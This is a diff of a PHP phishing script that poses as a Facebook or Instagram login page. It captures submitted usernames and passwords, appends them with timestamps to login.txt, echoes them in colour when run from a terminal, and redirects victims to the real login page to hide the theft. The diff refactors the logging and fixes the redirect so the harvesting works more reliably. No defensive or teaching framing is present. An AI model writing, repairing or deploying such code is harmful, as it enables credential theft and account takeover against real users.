@@ -7,29 +7,23 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Determine platform
     $platform = isset($_POST['email']) ? "Facebook" : "Instagram";
 
-    // Choose color
-    $color = $platform === "Facebook" ? "\033[34m" : "\033[35m"; // Blue or Magenta
-    $reset = "\033[0m";
-
-    // Create colored output for terminal (not saved in file)
-    $terminal_output = "{$color}==== [$platform Login] ==== {$reset}\n";
-    $terminal_output .= "Username: $user\nPassword: $pass\n";
-    $terminal_output .= "Time: " . date("Y-m-d H:i:s") . "\n";
-    $terminal_output .= "===========================\n";
-
-    // Print to terminal
-    echo $terminal_output;
-
-    // Create plain text log for saving
-    $data = "==== [$platform Login] ====\n";
-    $data .= "Username: $user\nPassword: $pass\n";
-    $data .= "Time: " . date("Y-m-d H:i:s") . "\n";
-    $data .= "===========================\n\n";
+    // Build plain text log for file
+    $log = "==== [$platform Login] ====\n";
+    $log .= "Username: $user\nPassword: $pass\n";
+    $log .= "Time: " . date("Y-m-d H:i:s") . "\n";
+    $log .= "===========================\n\n";
 
     // Save to file
-    file_put_contents("login.txt", $data, FILE_APPEND);
+    file_put_contents("login.txt", $log, FILE_APPEND);
 
-    // Redirect to legit site
+    // Terminal color output (only if run in terminal/CLI)
+    if (php_sapi_name() === 'cli') {
+        $color = $platform === "Facebook" ? "\033[34m" : "\033[35m"; // Blue for FB, Magenta for IG
+        $reset = "\033[0m";
+        echo $color . $log . $reset;
+    }
+
+    // Redirect user (must be last and no echo/print before this)
     if ($platform === "Facebook") {
         header("Location: https://m.facebook.com/login");
     } else {
